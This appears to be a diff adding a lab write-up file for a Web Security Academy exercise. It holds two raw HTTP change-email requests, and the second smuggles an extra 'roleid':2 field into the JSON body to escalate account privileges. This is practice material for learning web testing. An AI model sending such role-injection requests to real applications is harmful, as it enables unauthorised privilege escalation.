@@ -1,0 +1,29 @@
+// 1
+POST /my-account/change-email HTTP/1.1
+Host: ac4a1fff1ff2059880d725f300370001.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac4a1fff1ff2059880d725f300370001.web-security-academy.net/my-account?id=administrator
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 27
+Connection: close
+Cookie: session=SORYAzACSIFbQWNhchEwGnQOuf7hWIGh
+
+{"email":"kiddie@test.com"}
+
+// 2
+POST /my-account/change-email HTTP/1.1
+Host: ac4a1fff1ff2059880d725f300370001.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac4a1fff1ff2059880d725f300370001.web-security-academy.net/my-account?id=administrator
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 39
+Connection: close
+Cookie: session=SORYAzACSIFbQWNhchEwGnQOuf7hWIGh
+
+{"email":"kiddie@test.com", "roleid":2}
